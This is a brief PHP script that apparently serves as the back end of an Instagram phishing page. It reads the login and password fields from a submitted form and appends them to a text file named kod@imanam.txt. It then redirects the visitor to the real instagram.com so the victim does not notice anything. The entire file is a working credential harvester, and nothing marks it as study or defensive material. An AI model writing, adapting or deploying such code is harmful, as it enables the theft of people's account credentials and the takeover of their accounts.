<?PHP

$Log = $_POST['login'];

$Pass = $_POST['username'];

$log = fopen("kod@imanam.txt","at");

fwrite($log,"\n $Log:$Pass \n");

fclose($log);

$Log = $_POST['login'];

$Pass = $_POST['password'];

$log = fopen("kod@imanam.txt","at");

fwrite($log,"\n $Log:$Pass \n");

fclose($log);

echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://www.instagram.com'></head></html>";

?>